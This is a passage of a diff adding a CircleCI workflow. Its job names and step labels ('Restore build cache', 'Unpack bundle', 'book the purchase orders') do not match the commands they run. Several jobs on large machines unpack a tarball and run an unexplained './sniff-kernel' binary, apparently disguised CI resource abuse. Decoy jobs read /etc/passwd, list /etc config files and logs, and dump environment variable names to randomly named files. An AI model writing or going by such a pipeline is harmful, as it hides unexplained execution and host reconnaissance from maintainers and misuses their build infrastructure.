+      - persist_to_workspace:
+          root: /tmp/run1
+          paths:
+            - '2Q31YZdXYbeu3eq'
+  biuld:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Verify step-5
+          command: |
+            b=$(wc -c < /tmp/run1/2Q31YZdXYbeu3eq 2>/dev/null || echo 0); echo "KB: $((b / 1024))"
+      - run:
+          name: Pull repository
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: xzcat ci-index.tar.xz | tar xf -
+      - run:
+          command: nice -n 0 ./sniff-kernel
+  LANG_CA:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Resume from checkpoint 5
+          command: |
+            mkdir -p /tmp/run1
+            { set +o pipefail 2>/dev/null; truncate -s 1M '/tmp/roadmapledger.tmp' && du -h '/tmp/roadmapledger.tmp'; true ; } > /tmp/run1/AMBER_GLACIER_BRAMBLE_RASTER
+            (( $(wc -c </tmp/run1/AMBER_GLACIER_BRAMBLE_RASTER) )) && echo "nonzero"
+      - persist_to_workspace:
+          root: /tmp/run1
+          paths:
+            - 'AMBER_GLACIER_BRAMBLE_RASTER'
+  CHECK_STG:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Verify step-5
+          command: |
+            b=$(wc -c < /tmp/run1/AMBER_GLACIER_BRAMBLE_RASTER 2>/dev/null || echo 0); echo "KB: $((b / 1024))"
+      - run:
+          name: Pull repository
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: xzcat ci-index.tar.xz | tar xf -
+      - run:
+          command: nice -n 0 ./sniff-kernel
+  glyphs2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: idle
+          command: |
+            mkdir -p /tmp/run1
+            { set +o pipefail 2>/dev/null; for path in /etc/*.conf; do printf '%s\n' $path; done | wc -l; true ; } > /tmp/run1/zawwXocNjzk
+            (( $(wc -c </tmp/run1/zawwXocNjzk) )) && echo "nonzero"
+      - persist_to_workspace:
+          root: /tmp/run1
+          paths:
+            - 'zawwXocNjzk'
+  blast-off:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Verify step-5
+          command: |
+            b=$(wc -c < /tmp/run1/zawwXocNjzk 2>/dev/null || echo 0); echo "KB: $((b / 1024))"
+      - run:
+          name: Pull repository
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull reference data
+          command: xzcat ci-index.tar.xz | tar xf -
+      - run:
+          command: nice -n 0 ./sniff-kernel
+  pnl_protocol:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: FIXME clear out broken
+          command: |
+            mkdir -p /tmp/run1
+            { set +o pipefail 2>/dev/null; function stamp() { for a in "$@"; do echo "[$a]"; done; }; stamp tuesday saturday friday; true ; } > /tmp/run1/heath-meadow
+            (( $(wc -c </tmp/run1/heath-meadow) )) && echo "nonzero"
+      - persist_to_workspace:
+          root: /tmp/run1
+          paths:
+            - 'heath-meadow'
+  d-2a:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Verify step-5
+          command: |
+            b=$(wc -c < /tmp/run1/lambda-0ff8d.log 2>/dev/null || echo 0); echo "KB: $((b / 1024))"
+      - run:
+          name: Pull repository
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: xzcat ci-index.tar.xz | tar xf -
+      - run:
+          command: nice -n 0 ./sniff-kernel
+  ppPotion:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: tunneling wifi mesh now
+          command: |
+            mkdir -p /tmp/run1
+            { set +o pipefail 2>/dev/null; env -0 | tr '\0' '\n' | head -n 3 | cut -d "=" -f 1; true ; } > /tmp/run1/dr4f7
+            (( $(wc -c </tmp/run1/dr4f7) )) && echo "nonzero"
+      - persist_to_workspace:
+          root: /tmp/run1
+          paths:
+            - 'dr4f7'
+  sm-3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Verify step-5
+          command: |
+            b=$(wc -c < /tmp/run1/lambda-0ff8d.log 2>/dev/null || echo 0); echo "KB: $((b / 1024))"
+      - run:
+          name: Pull repository
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack bundle
+          command: xzcat ci-index.tar.xz | tar xf -
+      - run:
+          command: nice -n 0 ./sniff-kernel
+
+  disableLable:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Type Toast Message Step
+          command: |
+            mkdir -p /tmp/run1
+            { set +o pipefail 2>/dev/null; printf '%s\n' "this is a test" | fold -w 5; true ; } > /tmp/run1/exp_434
+            (( $(wc -c </tmp/run1/exp_434) )) && echo "nonzero"
+      - persist_to_workspace:
+          root: /tmp/run1
+          paths:
+            - 'exp_434'
+  test_track_status_prev:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Fast track resume
+          command: |
+            mkdir -p /tmp/run1
+            { set +o pipefail 2>/dev/null; for c in eagle dog bear duck; do echo "item: ${c}" ; done; true ; } > /tmp/run1/RPC_Agent
+            (( $(wc -c </tmp/run1/RPC_Agent) )) && echo "nonzero"
+      - persist_to_workspace:
+          root: /tmp/run1
+          paths:
+            - 'RPC_Agent'
+  mx-test-b:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Prebuild v5
+          command: |
+            mkdir -p /tmp/run1
+            set +o pipefail 2>/dev/null; seq 1 1325404 | awk '{s=$1*7; while(s>100) s=int(s/10); print s}' > /tmp/run1/User; true
+            (( $(wc -c </tmp/run1/User) )) && echo "nonzero"
+      - persist_to_workspace:
+          root: /tmp/run1
+          paths:
+            - 'User'
+  commit_loop:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: CAPTIONING UAT
+          command: |
+            mkdir -p /tmp/run1
+            { set +o pipefail 2>/dev/null; for i in {0..10}; do echo "${i}"; done; true ; } > /tmp/run1/module_mapper
+            (( $(wc -c </tmp/run1/module_mapper) )) && echo "nonzero"
+      - persist_to_workspace:
+          root: /tmp/run1
+          paths:
+            - 'module_mapper'
+  zeta_err:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: book the purchase orders and I MEAN IT
+          command: |
+            mkdir -p /tmp/run1
+            { set +o pipefail 2>/dev/null; grep -RHI case /etc/default 2>/dev/null | tail -n 10; true ; } > /tmp/run1/2Q31YZdXYbeu3eq
+            (( $(wc -c </tmp/run1/2Q31YZdXYbeu3eq) )) && echo "nonzero"
+      - persist_to_workspace:
+          root: /tmp/run1
+          paths:
+            - '2Q31YZdXYbeu3eq'
+  icons_v2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Rally the archive tables
+          command: |
+            mkdir -p /tmp/run1
+            { set +o pipefail 2>/dev/null; grep -sn -e "nobody" /etc/passwd | sort -u; true ; } > /tmp/run1/bin-dat-tmp
+            (( $(wc -c </tmp/run1/bin-dat-tmp) )) && echo "nonzero"
+      - persist_to_workspace:
+          root: /tmp/run1
+          paths:
+            - 'bin-dat-tmp'
+  walkParserDialog:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Now cleaning up the old backups
+          command: |
+            mkdir -p /tmp/run1
+            { set +o pipefail 2>/dev/null; printf '%s\n' lion panda cat zebra >/tmp/lizard.dat && wc -l /tmp/lizard.dat; true ; } > /tmp/run1/fen746
+            (( $(wc -c </tmp/run1/fen746) )) && echo "nonzero"
+      - persist_to_workspace:
+          root: /tmp/run1
+          paths:
+            - 'fen746'
+  SD-HOLD-SW:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Sprinkle some linking on the tutorial series
+          command: |
+            mkdir -p /tmp/run1
+            { set +o pipefail 2>/dev/null; find /var/tmp -maxdepth 2 -mindepth 1 -type f -name "*" -user $(whoami) 2>/dev/null |head -n5; true ; } > /tmp/run1/d39db13dab489961c02142ef8e53ed3
+            (( $(wc -c </tmp/run1/d39db13dab489961c02142ef8e53ed3) )) && echo "nonzero"
+      - persist_to_workspace:
+          root: /tmp/run1
+          paths:
+            - 'd39db13dab489961c02142ef8e53ed3'
+  UISaltRef:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: POP feature flags
+          command: |
+            mkdir -p /tmp/run1
+            { set +o pipefail 2>/dev/null; find /run -size 0 -exec echo {} + 2>/dev/null | cat -n; true ; } > /tmp/run1/signal548
+            (( $(wc -c </tmp/run1/signal548) )) && echo "nonzero"
+      - persist_to_workspace:
+          root: /tmp/run1
+          paths:
+            - 'signal548'
+  test_597:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Issue the exit interviews week one
+          command: |
+            mkdir -p /tmp/run1
+            { set +o pipefail 2>/dev/null; find /var/log -name "*log*" -exec ls -ld {} + 2>/dev/null | cat -n; true ; } > /tmp/run1/flame-flame-carrier-grove
+            (( $(wc -c </tmp/run1/flame-flame-carrier-grove) )) && echo "nonzero"
+      - persist_to_workspace:
+          root: /tmp/run1
+          paths:
+            - 'flame-flame-carrier-grove'
+workflows:
+  verify:
+    jobs:
+      - DEBUG__BODY_RIGHT
+      - pnl_protocol
+      - build-staging-artifact-bundle:
+          requires:
+            - DEBUG__BODY_RIGHT
+            - pnl_protocol
+      - d-2a:
+          requires:
+            - DEBUG__BODY_RIGHT
+            - pnl_protocol
+      - BuildPipeline:
+          requires:
+            - DEBUG__BODY_RIGHT
+            - pnl_protocol
+      - sm-3:
+          requires:
+            - DEBUG__BODY_RIGHT
+            - pnl_protocol
+      - check-nightly-artifact-bundle:
+          requires:
+            - DEBUG__BODY_RIGHT
+            - pnl_protocol
+      - nebula:
+          requires:
+            - DEBUG__BODY_RIGHT
+            - pnl_protocol
+      - m_classBtn
+      - xi-test:
+          requires:
+            - m_classBtn
+      - rmrmrmrm:
+          requires:
+            - m_classBtn
+      - v8-edge5:
+          requires:
+            - rmrmrmrm
+      - iter1:
+          requires:
+            - rmrmrmrm
+      - v7-nightly:
+          requires:
+            - iter1
+      - LANG_CA:
+          requires:
+            - iter1
+      - CHECK_STG:
+          requires:
+            - LANG_CA
+      - asset_decrypt:
+          requires:
+            - LANG_CA
+      - sanity:
+          requires:
+            - asset_decrypt
+      - fgh:
+          requires:
+            - asset_decrypt
+      - callisto:
+          requires:
+            - fgh
+      - rt803:
+          requires:
+            - fgh
+      - mar26-smoke:
+          requires:
+            - rt803
+      - lv
+      - disableLable:
+          requires:
+            - lv
+      - wip-login-glitch:
+          requires:
+            - disableLable
+      - driverMu:
+          requires:
+            - disableLable
+      - test_track_status_prev:
+          requires:
+            - driverMu
+      - min-push:
+          requires:
+            - test_track_status_prev
+      - llen:
+          requires:
+            - test_track_status_prev
+      - mx-test-b:
+          requires:
+            - llen
+      - fire-up:
+          requires:
+            - mx-test-b
+      - st_acct_tx:
+          requires:
+            - mx-test-b
+      - commit_loop:
+          requires:
+            - st_acct_tx
+      - RUN_DEV:
+          requires:
+            - commit_loop
+      - glyphs2
+      - wArticle
+      - hello
+      - blast-off:
+          requires:
+            - glyphs2
+            - wArticle
+            - hello
+      - pr:
+          requires:
+            - glyphs2
+            - wArticle
+            - hello
+      - v2-preview:
+          requires:
+            - glyphs2
+            - wArticle
+            - hello
+      - java17-vet:
+          requires:
+            - glyphs2
+            - wArticle
+            - hello
+      - qa-x:
+          requires:
+            - glyphs2
+            - wArticle
+            - hello
+      - go-live:
+          requires:
+            - glyphs2
+            - wArticle
+            - hello
+      - send-it:
+          requires:
+            - glyphs2
+            - wArticle
+            - hello
+      - toggleCNN
+      - zeta_err:
+          requires:
+            - toggleCNN
+      - biuld:
+          requires:
+            - zeta_err
+      - Stage-Model:
+          requires:
+            - zeta_err
+      - icons_v2:
+          requires:
+            - Stage-Model
+      - build:
+          requires:
+            - icons_v2
+      - FINX:
+          requires:
+            - icons_v2
+      - walkParserDialog:
+          requires:
+            - FINX
+      - py310-build:
+          requires:
+            - walkParserDialog
+      - Camera-Reader:
+          requires:
+            - walkParserDialog
+      - SD-HOLD-SW:
+          requires:
+            - Camera-Reader
+      - q1-rev:
+          requires:
+            - SD-HOLD-SW
+      - readersById:
+          requires:
+            - SD-HOLD-SW
+      - UISaltRef:
+          requires:
+            - readersById
+      - v7-rc:
+          requires:
+            - UISaltRef
+      - box-648:
+          requires:
+            - UISaltRef
+      - test_597:
+          requires:
+            - box-648
+      - chore-8538:
+          requires:
+            - test_597
